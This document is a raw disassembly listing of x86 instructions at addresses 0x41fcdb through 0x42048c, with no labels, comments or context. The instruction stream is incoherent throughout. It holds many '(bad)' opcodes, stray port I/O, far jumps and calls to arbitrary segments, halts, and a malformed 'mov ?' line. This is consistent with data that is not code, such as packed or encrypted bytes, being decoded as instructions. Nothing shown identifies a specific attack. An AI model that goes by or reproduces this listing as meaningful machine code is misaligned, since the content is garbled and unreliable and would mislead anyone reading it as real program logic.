  41fcdb:	or     edi,DWORD PTR [ebx-0x80]
  41fcde:	or     eax,0x4680bc1a
  41fce3:	daa    
  41fce4:	sbb    edi,DWORD PTR [edx+0x7be3ae23]
  41fcea:	mov    ds:0xb3d0c64e,al
  41fcef:	mov    dl,0x1b
  41fcf1:	(bad)  
  41fcf2:	(bad)  
  41fcf3:	scas   al,BYTE PTR es:[edi]
  41fcf4:	xchg   ebp,eax
  41fcf5:	lahf   
  41fcf6:	pop    edx
  41fcf7:	retf   
  41fcf8:	ss mov cl,0x8c
  41fcfb:	fidivr WORD PTR [eax+0x5d]
  41fcfe:	dec    edi
  41fcff:	add    esp,edx
  41fd01:	add    edx,DWORD PTR [edi+0x1ff838de]
  41fd07:	jns    0x41fd54
  41fd09:	xlat   BYTE PTR ds:[ebx]
  41fd0a:	or     al,0x5b
  41fd0c:	add    eax,0x1b27669e
  41fd11:	out    dx,eax
  41fd12:	push   ebp
  41fd13:	out    dx,eax
  41fd14:	jle    0x41fd45
  41fd16:	(bad)  
  41fd17:	sbb    eax,0xafff913b
  41fd1c:	in     eax,dx
  41fd1d:	mov    esi,DWORD PTR [edx]
  41fd1f:	nop
  41fd20:	xlat   BYTE PTR ds:[ebx]
  41fd21:	sahf   
  41fd22:	clc    
  41fd23:	pop    eax
  41fd24:	bound  edi,QWORD PTR [ebp+0x5e]
  41fd27:	jle    0x41fcd3
  41fd29:	pop    esi
  41fd2a:	mov    al,ds:0x15805591
  41fd2f:	or     al,0x60
  41fd31:	stos   DWORD PTR es:[edi],eax
  41fd32:	je     0x41fd07
  41fd34:	push   edx
  41fd35:	out    dx,al
  41fd36:	std    
  41fd37:	xlat   BYTE PTR ds:[ebx]
  41fd38:	pushaw 
  41fd3a:	daa    
  41fd3b:	mov    eax,ds:0xaa7bc8cc
  41fd40:	adc    ecx,edi
  41fd42:	adc    DWORD PTR [eax-0x7876b86f],ebp
  41fd48:	pusha  
  41fd49:	nop
  41fd4a:	mov    eax,eax
  41fd4c:	lock sahf 
  41fd4e:	call   DWORD PTR [edx+ecx*4+0x345716b9]
  41fd55:	jge    0x41fd15
  41fd57:	sbb    DWORD PTR [edi-0x38],0xc29117c8
  41fd5e:	pusha  
  41fd5f:	rol    eax,0x37
  41fd62:	and    eax,0x35a2e90c
  41fd67:	pop    ss
  41fd68:	icebp  
  41fd69:	loope  0x41fd35
  41fd6b:	je     0x41fd84
  41fd6d:	sahf   
  41fd6e:	lahf   
  41fd6f:	(bad)  
  41fd70:	loope  0x41fd00
  41fd72:	jbe    0x41fd6b
  41fd74:	add    ch,BYTE PTR fs:[edi+0x1840493a]
  41fd7b:	dec    ebp
  41fd7c:	imul   eax,ebp,0xd3405039
  41fd82:	push   edi
  41fd83:	mov    ah,0xec
  41fd85:	cmp    esp,edi
  41fd87:	pop    ebx
  41fd88:	mov    ecx,0x1353bc96
  41fd8d:	sub    al,0xf1
  41fd8f:	and    eax,0x5f0875f9
  41fd94:	push   ds
  41fd95:	mov    fs,WORD PTR [edx+0x7b241a8f]
  41fd9b:	add    BYTE PTR [ecx+0x76],bl
  41fd9e:	or     cl,BYTE PTR [ebx+ecx*2+0xb2fec1e]
  41fda5:	xchg   BYTE PTR [ecx+0x21],bl
  41fda8:	dec    eax
  41fda9:	mov    edx,DWORD PTR [ecx-0x1163192e]
  41fdaf:	fsub   QWORD PTR [eax+0x9]
  41fdb2:	out    0xce,eax
  41fdb4:	ficom  DWORD PTR [ebx-0x30]
  41fdb7:	iret   
  41fdb8:	jmp    0xc119:0x6848a3af
  41fdbf:	stos   DWORD PTR es:[edi],eax
  41fdc0:	adc    al,BYTE PTR [edx-0x7b6ba045]
  41fdc6:	sub    eax,0x2c419c80
  41fdcb:	adc    eax,0x1405fb47
  41fdd0:	add    al,0x14
  41fdd2:	sbb    al,0x37
  41fdd4:	mov    al,0x35
  41fdd6:	lock fwait
  41fdd8:	or     al,BYTE PTR [edi+0x9]
  41fddb:	or     cl,bh
  41fddd:	mov    ecx,0x774c2ee7
  41fde2:	xchg   esi,eax
  41fde3:	(bad)  
  41fde5:	jnp    0x41fdb6
  41fde7:	(bad)  
  41fde8:	test   BYTE PTR ds:[ebp+0xc],bl
  41fdec:	mov    al,ds:0x18ca9634
  41fdf1:	push   ecx
  41fdf2:	sbb    BYTE PTR [edx+0x4b103659],dl
  41fdf8:	clc    
  41fdf9:	ss cwde 
  41fdfb:	sbb    ebp,DWORD PTR es:[eax+eiz*8]
  41fdff:	cli    
  41fe00:	fwait
  41fe01:	hlt    
  41fe02:	mov    eax,ds:0xd054dc0a
  41fe07:	int3   
  41fe08:	xor    ecx,DWORD PTR [edx+0x5569dfc6]
  41fe0e:	add    bl,BYTE PTR [ecx+edi*1]
  41fe11:	loopne 0x41fe7f
  41fe13:	je     0x41fddd
  41fe15:	rcr    BYTE PTR [ecx-0x26d7bac3],1
  41fe1b:	ror    edx,1
  41fe1d:	and    ebp,eax
  41fe1f:	mov    ebp,0x8d66c47b
  41fe24:	hlt    
  41fe25:	cmc    
  41fe26:	cmp    eax,0x5815921e
  41fe2b:	mulps  xmm0,XMMWORD PTR [ebp-0x40]
  41fe2f:	test   DWORD PTR [esi-0x232cde74],esi
  41fe35:	(bad)  [ebx+0x33]
  41fe38:	ds out dx,al
  41fe3a:	or     al,0xa8
  41fe3c:	cwde   
  41fe3d:	ins    BYTE PTR es:[edi],dx
  41fe3e:	addr16 push esp
  41fe40:	adc    BYTE PTR [esi-0x75ed9c42],dh
  41fe46:	xlat   BYTE PTR ds:[ebx]
  41fe47:	nop
  41fe48:	xlat   BYTE PTR ds:[ebx]
  41fe49:	dec    ecx
  41fe4a:	rcr    BYTE PTR [ebx-0x5ee64d8a],1
  41fe50:	dec    esp
  41fe51:	push   ds
  41fe52:	fld    QWORD PTR [esi-0x78]
  41fe55:	mov    esp,eax
  41fe57:	call   0x35715d51
  41fe5c:	jg     0x41fe71
  41fe5e:	mov    dh,BYTE PTR [edx+eax*2-0x5f7b96ec]
  41fe65:	ret    
  41fe66:	sbb    al,0xf2
  41fe68:	xchg   edx,eax
  41fe69:	add    esp,DWORD PTR [edi-0x441c772d]
  41fe6f:	stc    
  41fe70:	pop    ebx
  41fe71:	clc    
  41fe72:	cmp    DWORD PTR [ecx-0x3b],edx
  41fe75:	xor    DWORD PTR [edi+edx*1-0x1d463fe5],edi
  41fe7c:	fdivr  QWORD PTR [edx]
  41fe7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe7f:	(bad)  
  41fe80:	adc    cl,dl
  41fe82:	jb     0x41fe42
  41fe84:	cmp    eax,0x4d7d5a00
  41fe89:	shr    BYTE PTR [edi+eiz*4-0x1a],cl
  41fe8d:	and    esi,ecx
  41fe8f:	push   ebp
  41fe90:	inc    ebx
  41fe91:	outs   dx,DWORD PTR ds:[esi]
  41fe92:	pop    esp
  41fe93:	adc    bl,BYTE PTR [eax]
  41fe95:	shl    DWORD PTR [ebx-0x16],cl
  41fe98:	(bad)  
  41fe99:	pop    eax
  41fe9a:	sbb    ecx,DWORD PTR [eax+0x7bdfbad1]
  41fea0:	push   eax
  41fea1:	pop    edx
  41fea2:	and    dl,BYTE PTR [edi]
  41fea4:	pop    ds
  41fea5:	aam    0xd1
  41fea7:	scas   al,BYTE PTR es:[edi]
  41fea8:	xchg   edi,eax
  41fea9:	mov    eax,0x63774ccc
  41feae:	out    0x93,eax
  41feb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41feb1:	jns    0x41ff2e
  41feb3:	mov    ds:0xaccda06f,eax
  41feb8:	adc    esp,esp
  41feba:	mov    ecx,0x134c07a8
  41febf:	ret    
  41fec0:	inc    ebp
  41fec1:	or     al,0x28
  41fec3:	aaa    
  41fec4:	inc    edi
  41fec5:	out    dx,eax
  41fec6:	ja     0x41fed9
  41fec8:	imul   ebp,DWORD PTR [edx],0x1f
  41fecb:	add    al,0x2f
  41fecd:	lahf   
  41fece:	xor    eax,0xcd761da0
  41fed3:	rol    BYTE PTR [esi],0xdc
  41fed6:	pop    edx
  41fed7:	push   esi
  41fed8:	hlt    
  41fed9:	xor    esp,edi
  41fedb:	mov    esi,0x942a7cd1
  41fee0:	jl     0x41ff0d
  41fee2:	push   cs
  41fee3:	cwde   
  41fee4:	jmp    0x7e54ca61
  41fee9:	outs   dx,BYTE PTR ds:[esi]
  41feea:	in     al,0x84
  41feec:	nop
  41feed:	hlt    
  41feee:	mov    esi,0xee1cc084
  41fef3:	mov    ah,0x5c
  41fef5:	adc    ebx,DWORD PTR [ebx+0x42]
  41fef8:	dec    esp
  41fef9:	sub    ecx,DWORD PTR ss:[edx+ebx*8]
  41fefd:	inc    ecx
  41fefe:	mov    BYTE PTR [ebx+0x7cfa8065],dh
  41ff04:	jbe    0x41fee4
  41ff06:	call   FWORD PTR ds:0xf4fa48a9
  41ff0c:	inc    ecx
  41ff0d:	push   edi
  41ff0e:	push   cs
  41ff0f:	dec    edx
  41ff10:	popf   
  41ff11:	dec    ecx
  41ff12:	es pop ecx
  41ff14:	mov    BYTE PTR [esi-0xe],cl
  41ff17:	or     al,0x39
  41ff19:	xor    cl,BYTE PTR [edx+ebp*2+0x50]
  41ff1d:	shl    BYTE PTR [ebp-0x432f221f],cl
  41ff23:	adc    bh,BYTE PTR [edi-0x4d]
  41ff26:	lock rcr eax,1
  41ff29:	xchg   ebp,eax
  41ff2a:	xchg   ebx,eax
  41ff2b:	jns    0x41ff97
  41ff2d:	push   ebx
  41ff2e:	mov    eax,ds:0x1f610d0c
  41ff33:	pop    esp
  41ff34:	shl    BYTE PTR [eax],cl
  41ff36:	or     BYTE PTR [ebp-0x39],bl
  41ff39:	pop    edi
  41ff3a:	pop    es
  41ff3b:	gs jne 0xb7dfcfa7
  41ff42:	mov    dl,0x38
  41ff44:	mov    ebp,0x359c3ffa
  41ff49:	mov    ?,WORD PTR [ecx-0x777ca79]
  41ff4f:	mov    WORD PTR [ecx+0x74],fs
  41ff52:	xchg   BYTE PTR [ebx+0x6b],bh
  41ff55:	pop    ebx
  41ff56:	nop
  41ff57:	xchg   ch,bl
  41ff59:	jae    0x41ffaf
  41ff5b:	adc    BYTE PTR [esi-0x5a],ch
  41ff5e:	push   esi
  41ff5f:	inc    edx
  41ff60:	sub    DWORD PTR [ebp-0x68d32277],edx
  41ff66:	adc    BYTE PTR [ebx],ch
  41ff68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff69:	dec    ecx
  41ff6a:	inc    esi
  41ff6b:	not    BYTE PTR [ecx+0x32]
  41ff6e:	sbb    eax,DWORD PTR [eax+0x3d]
  41ff71:	out    dx,eax
  41ff72:	sub    ebp,edi
  41ff74:	jp     0x41ff6f
  41ff76:	mov    ds:0x7c903879,al
  41ff7b:	(bad)  
  41ff7c:	pop    esp
  41ff7d:	push   cs
  41ff7e:	cpuid  
  41ff80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff81:	and    ebp,DWORD PTR [ebx-0x4e]
  41ff84:	pop    esi
  41ff85:	inc    esp
  41ff86:	popf   
  41ff87:	addr16 loope 0x41ff8f
  41ff8a:	mov    ss,WORD PTR [esi+0x4b59a999]
  41ff90:	std    
  41ff91:	and    al,0xca
  41ff93:	std    
  41ff94:	retf   
  41ff95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff96:	cmp    cl,dh
  41ff98:	div    ch
  41ff9a:	pop    ds
  41ff9b:	cmp    DWORD PTR ds:0x232bb0e5,ecx
  41ffa1:	dec    ecx
  41ffa2:	cmc    
  41ffa3:	pop    ecx
  41ffa4:	iret   
  41ffa5:	enter  0xefd8,0x70
  41ffa9:	xlat   BYTE PTR ds:[ebx]
  41ffaa:	je     0x41ffc5
  41ffac:	or     bl,BYTE PTR [edi]
  41ffae:	ror    DWORD PTR [esp+ecx*4+0x3d9daf9e],1
  41ffb5:	sbb    esi,DWORD PTR [ebx+edx*2+0x6a8103a5]
  41ffbc:	xor    ecx,DWORD PTR [edi-0x36]
  41ffbf:	mov    ds:0x632dd7bf,al
  41ffc4:	inc    ebx
  41ffc5:	inc    ecx
  41ffc6:	(bad)  
  41ffc7:	sbb    DWORD PTR [ebx-0x5cdc73de],ebp
  41ffcd:	add    eax,0x86a082fc
  41ffd2:	cmp    eax,0x6bdd9549
  41ffd7:	arpl   WORD PTR [ecx+0x616a9047],bp
  41ffdd:	add    BYTE PTR [ecx+0x6],ah
  41ffe0:	adc    edi,DWORD PTR [eax]
  41ffe2:	popf   
  41ffe3:	mov    bh,0x68
  41ffe5:	sbb    eax,0x4f95bbb1
  41ffea:	cld    
  41ffeb:	into   
  41ffec:	out    dx,al
  41ffed:	pop    esi
  41ffee:	stos   DWORD PTR es:[edi],eax
  41ffef:	out    0x88,eax
  41fff1:	mov    gs,WORD PTR [edi]
  41fff3:	(bad)  
  41fff5:	pop    esi
  41fff6:	jb     0x41ff8d
  41fff8:	pop    es
  41fff9:	jmp    0x2272:0x74808bff
  420000:	mov    edi,0x4d71726f
  420005:	adc    dl,BYTE PTR [edi+0x24b7c5d4]
  42000b:	push   ecx
  42000c:	and    ebp,DWORD PTR [ecx]
  42000e:	fldenv [edi]
  420010:	in     eax,0xe8
  420012:	(bad)  
  420013:	fisttp QWORD PTR [ecx-0x1c6aba02]
  420019:	pop    ecx
  42001a:	aas    
  42001b:	mov    ebx,0xaf9f1e47
  420020:	and    BYTE PTR [esp+edx*8+0x5c],ah
  420024:	lea    ecx,[edi+0x79]
  420027:	pop    ecx
  420028:	jmp    0xf91f:0x8d80cbf6
  42002f:	jg     0x420089
  420031:	adc    al,0xd7
  420033:	leave  
  420034:	cmp    dl,BYTE PTR [eax]
  420036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420037:	pop    ss
  420038:	shl    BYTE PTR [eax-0x40],1
  42003b:	or     eax,DWORD PTR [ecx]
  42003d:	shl    BYTE PTR [ebx+edi*8],cl
  420040:	sub    BYTE PTR [ebx-0x39],0x9a
  420044:	out    0xff,al
  420046:	and    eax,0x27bf5fad
  42004b:	(bad)  [ebp+0x70]
  42004e:	cmp    DWORD PTR [esi+0x62],edx
  420051:	ret    
  420052:	jmp    0x420043
  420054:	fist   WORD PTR [esi-0x56]
  420057:	or     edx,DWORD PTR [esi+ebx*8]
  42005a:	mov    cl,0x8f
  42005c:	inc    ecx
  42005d:	push   es
  42005e:	add    al,0xab
  420060:	sbb    eax,0xbccc105e
  420065:	test   eax,0xb9b51723
  42006a:	and    dh,BYTE PTR [edi-0x6c9eb109]
  420070:	pop    es
  420071:	mov    al,ds:0x763e8d2d
  420076:	aas    
  420077:	shr    esp,0x58
  42007a:	push   esp
  42007b:	mov    esp,0xb14d5bd9
  420080:	inc    ecx
  420081:	sbb    BYTE PTR [edi+0x3e],dl
  420084:	and    BYTE PTR [edi],dl
  420086:	xor    BYTE PTR [eax],dh
  420088:	push   ecx
  420089:	test   DWORD PTR [ebp-0x78],esi
  42008c:	sub    DWORD PTR [ebp+0x11a4bb4a],0xfffffff3
  420093:	sbb    al,0xc0
  420095:	push   esp
  420096:	sub    DWORD PTR [edx-0x10],0x3544fd83
  42009d:	stos   BYTE PTR es:[edi],al
  42009e:	xchg   BYTE PTR [ebx-0x58],bh
  4200a1:	mov    edi,0xca7969d1
  4200a6:	out    dx,al
  4200a7:	inc    eax
  4200a8:	adc    eax,0x47054ea
  4200ad:	test   BYTE PTR [esi+0x40397a61],bl
  4200b3:	(bad)  
  4200b4:	aas    
  4200b5:	ins    DWORD PTR es:[edi],dx
  4200b6:	xchg   ecx,eax
  4200b7:	repnz inc ecx
  4200b9:	bound  ebp,QWORD PTR [ebx]
  4200bb:	jmp    0x420052
  4200bd:	push   edi
  4200be:	in     eax,0x5c
  4200c0:	movsx  ebx,WORD PTR [eax]
  4200c3:	call   0x49e5:0x83efe702
  4200ca:	scas   al,BYTE PTR es:[edi]
  4200cb:	xor    eax,0xeb74924b
  4200d0:	push   ebx
  4200d1:	dec    edx
  4200d2:	(bad)  
  4200d3:	das    
  4200d4:	test   BYTE PTR [ebx],ch
  4200d6:	mov    ss,WORD PTR [edx]
  4200d8:	cli    
  4200d9:	daa    
  4200da:	xchg   cl,bl
  4200dc:	sbb    eax,0xcf65f4d3
  4200e1:	jne    0x4200b0
  4200e3:	fwait
  4200e4:	nop
  4200e5:	cwde   
  4200e6:	imul   esp,DWORD PTR [eax-0x10],0xffffff8b
  4200ea:	ds xor edi,esp
  4200ed:	or     esi,DWORD PTR [edi-0x56ba06b8]
  4200f3:	sub    eax,0x1d428078
  4200f8:	(bad)  
  4200f9:	push   ss
  4200fa:	ja     0x420170
  4200fc:	mov    ah,0xad
  4200fe:	lahf   
  4200ff:	cli    
  420100:	mov    al,ds:0xb5575020
  420105:	lahf   
  420106:	gs sar dl,cl
  420109:	call   0x7233d99b
  42010e:	cmp    ch,ch
  420110:	aam    0x9
  420112:	popa   
  420113:	adc    BYTE PTR [eax-0x78303757],cl
  420119:	dec    ecx
  42011a:	ds daa 
  42011c:	fild   QWORD PTR [esi-0x70]
  42011f:	loopne 0x4200d0
  420121:	cmp    BYTE PTR [edx],dl
  420123:	add    BYTE PTR [edi-0x665e9812],dl
  420129:	pop    ebx
  42012a:	adc    DWORD PTR [esi-0x28886e2c],edi
  420130:	or     DWORD PTR [ebp+0x7f],edx
  420133:	(bad)  
  420134:	scas   al,BYTE PTR es:[edi]
  420135:	mov    eax,ds:0xccfe8cc1
  42013a:	inc    eax
  42013b:	mov    ebx,0x3d965709
  420140:	jl     0x420127
  420142:	fbstp  TBYTE PTR [edi+eiz*4-0x7b]
  420146:	adc    DWORD PTR [edx+0x43],ebx
  420149:	gs sbb dh,ah
  42014c:	popf   
  42014d:	addr16 out 0xe2,eax
  420150:	push   ebx
  420151:	in     eax,dx
  420152:	pop    edi
  420153:	or     dh,BYTE PTR [edi+0x4e]
  420156:	adc    eax,eax
  420158:	cmp    DWORD PTR [ebx+eax*2],ebp
  42015b:	mov    eax,0xe99db31c
  420160:	ret    
  420161:	ror    DWORD PTR [ebp-0x63],0xb8
  420165:	xchg   BYTE PTR [ecx],ah
  420167:	inc    edx
  420168:	iret   
  420169:	test   DWORD PTR [ecx+ecx*8-0x42fd0e3f],edx
  420170:	mov    edi,0xabdddd91
  420175:	fsubr  DWORD PTR [edx]
  420177:	xor    bh,BYTE PTR [edx-0x69]
  42017a:	ja     0x42019d
  42017c:	adc    BYTE PTR [ebp-0x1fd3c1ab],dl
  420182:	shl    ch,0x60
  420185:	lahf   
  420186:	push   edx
  420187:	(bad)  
  420189:	inc    eax
  42018a:	retf   0xcd88
  42018d:	add    edx,esp
  42018f:	pop    ebx
  420190:	mov    DWORD PTR [ebx+0x4e],edx
  420193:	fcom   DWORD PTR [eax]
  420195:	popa   
  420196:	push   es
  420197:	and    DWORD PTR [eax+0x610364c0],esi
  42019d:	inc    esp
  42019e:	add    DWORD PTR [ebp+0xc5c8491],ebx
  4201a4:	mov    esp,0xeeb2adb2
  4201a9:	mov    ds:0x1c50a89,eax
  4201ae:	mov    ebp,0xa0ae342e
  4201b3:	test   DWORD PTR [esi],eax
  4201b5:	lock inc eax
  4201b7:	sbb    BYTE PTR [eax-0x508bfc11],cl
  4201bd:	daa    
  4201be:	xchg   ebx,eax
  4201bf:	stc    
  4201c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201c1:	xor    ah,BYTE PTR ds:0x37b0a759
  4201c7:	imul   edx,DWORD PTR [ebp-0x75],0xc482bb52
  4201ce:	add    ch,BYTE PTR [ecx+0x4d]
  4201d1:	sub    BYTE PTR [edx],0xcf
  4201d4:	push   edi
  4201d5:	push   ebx
  4201d6:	sti    
  4201d7:	fdiv   DWORD PTR [ecx+eiz*8+0x49]
  4201db:	pop    eax
  4201dc:	in     al,dx
  4201dd:	cwde   
  4201de:	in     eax,0xdd
  4201e0:	rcr    DWORD PTR [esi-0x5d417d58],1
  4201e6:	retf   0xa68
  4201e9:	jne    0x4201c3
  4201eb:	test   eax,0x1ba86f5c
  4201f0:	add    al,0xae
  4201f2:	outs   dx,BYTE PTR ds:[esi]
  4201f3:	push   edi
  4201f4:	dec    edi
  4201f5:	sbb    ch,BYTE PTR [esi]
  4201f7:	in     al,dx
  4201f8:	pop    esi
  4201f9:	(bad)  
  4201fa:	ins    BYTE PTR es:[edi],dx
  4201fb:	shl    DWORD PTR [esi],0xb0
  4201fe:	push   cs
  4201ff:	imul   ebp,DWORD PTR [ecx+0x5b],0x6f
  420203:	sub    cl,dh
  420205:	jno    0x420218
  420207:	mov    edx,0x33b18625
  42020c:	jns    0x42020f
  42020e:	inc    esp
  42020f:	in     eax,0xe2
  420211:	dec    edx
  420212:	fwait
  420213:	and    DWORD PTR [edx-0x129dc24c],ecx
  420219:	into   
  42021a:	mov    ch,BYTE PTR gs:[ebx+0x6cfc9ef5]
  420221:	xor    bh,BYTE PTR [edi]
  420223:	jle    0x420253
  420225:	pusha  
  420226:	pusha  
  420227:	aad    0x15
  420229:	int    0x91
  42022b:	pop    ebp
  42022c:	enter  0x823f,0x9
  420230:	mov    ebp,0x23d4e4ee
  420235:	rcl    DWORD PTR [esi+0x53],cl
  420238:	les    ecx,FWORD PTR [ebx-0x6f555bb9]
  42023e:	or     edi,DWORD PTR [esi+0x79]
  420241:	stc    
  420242:	ret    
  420243:	imul   sp,WORD PTR [edi],0xb0f2
  420248:	sbb    al,0xbd
  42024a:	mov    esp,0xb7d13bb6
  42024f:	ss jmp 0x4201f0
  420252:	or     DWORD PTR cs:[ebx+0x54562c34],0x18
  42025a:	push   0x6b
  42025c:	loopne 0x420259
  42025e:	pop    ss
  42025f:	push   es
  420260:	data16 jg 0x4202d8
  420263:	idiv   dl
  420265:	mov    eax,ds:0x55f299d8
  42026a:	dec    edi
  42026b:	sbb    dh,ah
  42026d:	je     0x4202eb
  42026f:	adc    al,0x84
  420271:	inc    ebx
  420272:	pop    edx
  420273:	ins    DWORD PTR es:[edi],dx
  420274:	or     ebx,edi
  420276:	xor    esi,DWORD PTR [esi+0x1e7d5f93]
  42027c:	pop    ds
  42027d:	and    cl,BYTE PTR [ebx-0x62b61eda]
  420283:	sbb    DWORD PTR [edi],edx
  420285:	push   ss
  420286:	mov    eax,ds:0x25e839f6
  42028b:	es or  esp,esi
  42028e:	xchg   ebx,eax
  42028f:	push   ds
  420290:	imul   ebx,DWORD PTR [esi],0x6a0be7b1
  420296:	pop    edx
  420297:	mov    ebx,ecx
  420299:	repz pop ebx
  42029b:	leave  
  42029c:	ja     0x42026d
  42029e:	pop    ebp
  42029f:	loopne 0x4202cb
  4202a1:	(bad)  
  4202a2:	(bad)  
  4202a4:	es jle 0x4202ae
  4202a7:	popf   
  4202a8:	adc    al,0x86
  4202aa:	push   0x66230927
  4202af:	xchg   DWORD PTR [edx-0x76],esp
  4202b2:	out    0xed,eax
  4202b4:	mov    al,ds:0x54d1f8dc
  4202b9:	dec    ebp
  4202ba:	inc    eax
  4202bb:	xor    DWORD PTR [ebp+0x7fd8bec5],0xb
  4202c2:	mov    cs,ebp
  4202c4:	xor    cl,BYTE PTR [esi-0x25]
  4202c7:	and    ch,BYTE PTR [edi+esi*4]
  4202ca:	add    cl,BYTE PTR [ebp+0x343647f8]
  4202d0:	std    
  4202d1:	xchg   ecx,eax
  4202d2:	sti    
  4202d3:	xchg   ebp,eax
  4202d4:	or     esp,esp
  4202d6:	lea    ecx,[edx-0x29378963]
  4202dc:	lahf   
  4202dd:	les    edx,FWORD PTR [edi+0x48]
  4202e0:	es or  eax,0xe70db58d
  4202e6:	popa   
  4202e7:	jae    0x420350
  4202e9:	push   esi
  4202ea:	out    dx,al
  4202eb:	xchg   esi,eax
  4202ec:	add    eax,0x8493f614
  4202f1:	xchg   ebp,eax
  4202f2:	jg     0x4202d3
  4202f4:	ss mov ebp,0xf5a309f4
  4202fa:	jg     0x42033a
  4202fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202fd:	xchg   edi,ecx
  4202ff:	mov    ebp,0xef5bd4eb
  420304:	aam    0x57
  420306:	bnd ret 
  420308:	out    dx,al
  420309:	cmp    ebp,DWORD PTR [eax]
  42030b:	fist   DWORD PTR ds:0xb8ac2f96
  420311:	es aas 
  420313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420314:	repnz push edi
  420316:	ins    DWORD PTR es:[edi],dx
  420317:	shr    DWORD PTR ds:0xe7a5d840,0x98
  42031e:	lock cmp edi,edi
  420321:	xor    DWORD PTR [esi-0x5a],0xffffffa4
  420325:	fsubr  st,st(1)
  420327:	mov    dh,0x82
  420329:	inc    edi
  42032a:	into   
  42032b:	(bad)
  42032e:	ja     0x42039c
  420330:	rol    esp,cl
  420332:	cli    
  420333:	xor    eax,0x7ee7cf2b
  420338:	mov    ebx,0x34b3f726
  42033d:	inc    esi
  42033e:	xor    dl,BYTE PTR [eax+0x36]
  420341:	ret    0xf2f6
  420344:	(bad)  
  420345:	ins    BYTE PTR es:[edi],dx
  420346:	sub    ebx,esp
  420348:	shr    BYTE PTR [ecx],1
  42034a:	sub    ebx,DWORD PTR [edi]
  42034c:	adc    DWORD PTR [ebx-0x2b],0x5185933b
  420353:	inc    edi
  420354:	aad    0x12
  420356:	or     al,0xa4
  420358:	nop
  420359:	gs dec ebx
  42035b:	pop    ecx
  42035c:	ds pop DWORD PTR ds:[ebp+0x92632e3]
  420364:	jmp    FWORD PTR [ebx+0x33]
  420367:	pop    edi
  420368:	fsub   DWORD PTR [ebp-0x6f]
  42036b:	mov    ds:0x570d3c26,eax
  420370:	pop    ebp
  420371:	adc    esi,DWORD PTR [eax]
  420373:	add    BYTE PTR [ecx],bh
  420375:	sub    dl,BYTE PTR [edx-0x8]
  420378:	les    edi,FWORD PTR [edi]
  42037a:	(bad)  
  42037b:	adc    ebp,DWORD PTR [eax]
  42037d:	out    dx,eax
  42037e:	mov    DWORD PTR [esi],esp
  420380:	mov    eax,0xc5bfd3c
  420385:	add    DWORD PTR [eax+0x18cd41c0],eax
  42038b:	mov    ecx,0x11b350ba
  420390:	dec    edx
  420391:	loop   0x420352
  420393:	jg     0x420332
  420395:	jo     0x4203f9
  420397:	mov    ebp,DWORD PTR [esi]
  420399:	in     eax,0x52
  42039b:	ror    DWORD PTR [ecx-0x194aada6],1
  4203a1:	mov    al,ds:0x12b5acb2
  4203a6:	pop    eax
  4203a7:	mov    bh,0x87
  4203a9:	xchg   BYTE PTR [esp+eax*8],bh
  4203ac:	or     al,0xd7
  4203ae:	rcl    BYTE PTR [esi-0x44694195],1
  4203b4:	shr    BYTE PTR [edx+eax*2],1
  4203b7:	out    dx,al
  4203b8:	fistp  DWORD PTR [edx]
  4203ba:	adc    bl,dh
  4203bc:	in     eax,0xe2
  4203be:	mov    esi,0x9408b3ee
  4203c3:	mov    bl,0x28
  4203c5:	loopne 0x420388
  4203c7:	xchg   ebp,eax
  4203c8:	pushf  
  4203c9:	jno    0x4203e8
  4203cb:	adc    ah,BYTE PTR [ebx+ecx*1]
  4203ce:	adc    dl,bh
  4203d0:	mov    al,ds:0x8c919576
  4203d5:	jb     0x420381
  4203d7:	push   cs
  4203d8:	pushf  
  4203d9:	into   
  4203da:	call   0x7427:0xf89b96d1
  4203e1:	jb     0x42041e
  4203e3:	call   0xd4ec:0x3ad2460f
  4203ea:	pushf  
  4203eb:	ins    BYTE PTR es:[edi],dx
  4203ec:	xchg   DWORD PTR [edi+0xd],edi
  4203ef:	(bad)  
  4203f1:	cmc    
  4203f2:	push   edx
  4203f3:	mov    ebp,0x8e18f364
  4203f8:	sub    ebx,DWORD PTR [edi+ecx*1]
  4203fb:	fmul   st,st(1)
  4203fd:	(bad)  
  4203ff:	pop    esi
  420400:	mov    bh,0x66
  420402:	sub    esi,DWORD PTR [ebp+0x442c1762]
  420408:	pop    eax
  420409:	shr    DWORD PTR [edx],0xf4
  42040c:	sub    eax,0x3ba3e6de
  420411:	daa    
  420412:	mov    gs,WORD PTR [eax+eax*4-0x7f4e3f16]
  420419:	mov    edx,0x4799779d
  42041e:	rcl    BYTE PTR [eax],1
  420420:	into   
  420421:	daa    
  420422:	aam    0xe4
  420424:	cdq    
  420425:	inc    ebp
  420426:	ins    BYTE PTR es:[edi],dx
  420427:	mov    eax,ds:0xd5c870ff
  42042c:	mov    bl,0x62
  42042e:	mov    edi,DWORD PTR [ebx]
  420430:	lahf   
  420431:	jbe    0x420461
  420433:	sbb    eax,0x4f04df37
  420438:	jnp    0x420427
  42043a:	adc    al,0xf
  42043c:	fs hlt 
  42043e:	dec    ecx
  42043f:	mov    bl,0x71
  420441:	pop    edi
  420442:	jg     0x420494
  420444:	jge    0x4203f8
  420446:	add    ebp,DWORD PTR [ebx-0x21b2c19c]
  42044c:	js     0x4203e1
  42044e:	in     eax,0x47
  420450:	jmp    0xc6ce0d24
  420455:	out    0xea,al
  420457:	popa   
  420458:	fs mov edi,0x4758b90
  42045e:	mov    WORD PTR [eax+0x60],fs
  420461:	add    bl,ah
  420463:	mov    edi,DWORD PTR [eax]
  420465:	stos   BYTE PTR es:[edi],al
  420466:	ss nop
  420468:	cmp    DWORD PTR [ebx],ebp
  42046a:	pop    edx
  42046b:	in     eax,0xf4
  42046d:	out    0x6,al
  42046f:	jnp    0x4204e9
  420471:	dec    ebx
  420472:	mov    eax,0x40c4a48a
  420477:	sbb    al,0x7f
  420479:	xor    al,0x2f
  42047b:	das    
  42047c:	inc    esi
  42047d:	das    
  42047e:	loop   0x420437
  420480:	mov    dh,0x4f
  420482:	sub    DWORD PTR [esi+0x3e],edx
  420485:	into   
  420486:	push   ss
  420487:	cmp    eax,0xae29f118
  42048c:	(bad)  
